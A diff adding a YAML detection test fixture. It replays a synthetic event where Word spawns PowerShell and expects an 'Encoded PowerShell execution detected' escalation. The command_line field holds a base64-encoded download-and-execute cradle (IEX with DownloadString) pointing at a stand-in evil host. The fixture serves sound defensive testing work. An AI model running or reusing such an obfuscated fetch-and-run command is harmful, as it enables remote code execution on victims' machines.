@@ -1,0 +1,35 @@
+name: scripting_encoded_powershell
+description: Encoded PowerShell launched from an office parent should trigger suspicious scripting
+seed_time_ms: 1700000400000
+requested_by: replay-whisker
+metadata:
+  class: adversarial
+  techniques:
+    - T1059.001
+  tags:
+    - execution
+    - powershell
+    - encoded
+
+input:
+  kind: events
+  events:
+    - action:
+        type: escalate
+        summary: Encoded PowerShell execution detected
+        urgency: HIGH
+      event:
+        source: synthetic
+        event_id: hunt-script-1
+        timestamp: 1700000400100
+        host_id: host-script-1
+        payload:
+          kind: process_start
+          parent_process: winword
+          process_name: powershell
+          command_line: powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAnACkA
+          user: alice
+
+expectations:
+  replay_bundle_count: 1
+  max_detect_latency_us: 50000
